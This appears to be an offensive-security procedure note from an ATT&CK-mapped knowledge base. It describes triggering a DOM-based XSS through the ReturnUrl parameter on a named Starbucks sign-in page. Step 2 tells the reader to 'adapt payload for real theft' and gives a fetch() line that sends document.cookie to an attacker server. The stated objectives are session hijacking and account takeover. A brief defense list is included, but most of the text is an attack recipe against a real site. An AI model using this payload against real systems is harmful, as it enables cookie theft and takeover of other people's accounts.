---
tags:
  - xss
  - execution
  - cookie-theft
type: procedure
tools: []
tactics:
  - '[[Execution]]'
  - '[[Collection]]'
commands: []
platforms:
  - Web
techniques:
  - '[[JavaScript]]'
skill_level: intermediate
impact_level: high
detection_risk: medium
sub_techniques: []
id: 9a939f7f-f6ce-411d-98a6-993d442b03ca
created_at: '2025-12-13T23:52:21.122Z'
updated_at: '2025-12-13T23:52:21.122Z'
verified: false
validated: true
submitted: true
mitre_tactics:
  - '[[Execution]]'
  - '[[Collection]]'
mitre_techniques:
  - '[[JavaScript]]'
---
# Trigger-DOM-XSS-Payload-on-Sign-In

## Summary

This procedure triggers the execution of the injected JavaScript payload by completing the sign-in process on the vulnerable Starbucks page, leading to DOM manipulation and arbitrary code execution for stealing session cookies.

## Description

After loading the malicious URL, submitting the sign-in form causes the application to process the ReturnUrl parameter, injecting it into the DOM (e.g., via location.href or innerHTML). This executes the JavaScript in the victim's context, allowing access to document.cookie for session hijacking. The attack relies on the victim's credentials but steals them post-authentication. Expected outcomes include alert popups for proof-of-concept or data exfiltration to an attacker server.

## Requirements

1. Valid Starbucks account credentials (victim's own for testing)
2. Loaded malicious sign-in page from prior procedure
3. Browser with JavaScript enabled

## Defense

Defensive measures and detection strategies:

- Encode and validate all user inputs before DOM insertion
- Deploy XSS auditors or WAF rules to block JavaScript URIs
- Log and alert on successful sign-ins with suspicious ReturnUrl values

## Objectives

1. Execute injected JavaScript in authenticated context
2. Access and exfiltrate session cookies
3. Achieve account takeover via hijacked sessions

## Instructions

### Step 1: Enter Credentials and Submit

**Context**: Authenticate to force ReturnUrl processing and payload execution.

Fill in the username/email and password fields on the sign-in form, then click 'Sign In'.

No command; perform in browser.

> The form submission redirects or updates the DOM, triggering the javascript: URI and executing the payload.

### Step 2: Observe Execution and Exfiltrate Data

**Context**: Confirm execution and adapt payload for real theft.

Upon execution, an alert shows 'app.starbucks.com' (document.domain). For exploitation, replace alert with:

```javascript
fetch('https://attacker.com/steal?cookie=' + document.cookie);
```

**Expected Output**: Alert popup or network request to attacker server with cookies.

> In console, verify document.cookie contains session tokens; success enables unauthorized access.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]
- [[Collection]]

### Techniques

- [[JavaScript]]

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- [[xss]]
- [[Execution]]
- [[theft]]
